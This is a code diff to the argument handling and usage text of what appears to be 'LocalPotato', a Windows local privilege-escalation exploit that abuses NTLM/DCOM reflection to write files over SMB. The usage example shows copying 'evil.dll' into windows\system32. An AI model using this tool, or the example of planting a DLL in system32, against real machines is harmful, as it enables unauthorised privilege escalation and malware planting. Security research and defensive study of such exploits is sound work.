@@ -60,6 +60,11 @@ int wmain(int argc, wchar_t** argv)
 		++cnt;
 		--argc;
 	}
+	if (destfname == NULL || inputfname == NULL)
+	{
+		usage();
+		return 1;
+	}
 	HANDLE hTread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SMBAuthenticatedFileWrite), NULL, 0, NULL);
 	HookSSPIForDCOMReflection();
 	PotatoTrigger(clsidStr, comPort, hTread);
@@ -72,8 +77,13 @@ int wmain(int argc, wchar_t** argv)
 void usage()
 {
 	printf("\n");
-	printf("Args: \n"
+	printf("Mandatory Args: \n"
+		"-i Source file to copy\n"
+		"-d Destination file - do not specify the drive letter\n"
+		"Example: localpotato -i c:\\hacker\\evil.dll -d windows\\system32\\evil.dll\n\n"
+	);
+	printf("Optional Args: \n"
 		"-c CLSID (Default {854A20FB-2D44-457D-992F-EF13785D2B51})\n"
-		"-p COM server port (Default 12345)\n"
+		"-p COM server port (Default 10271)\n"
 	);
 }
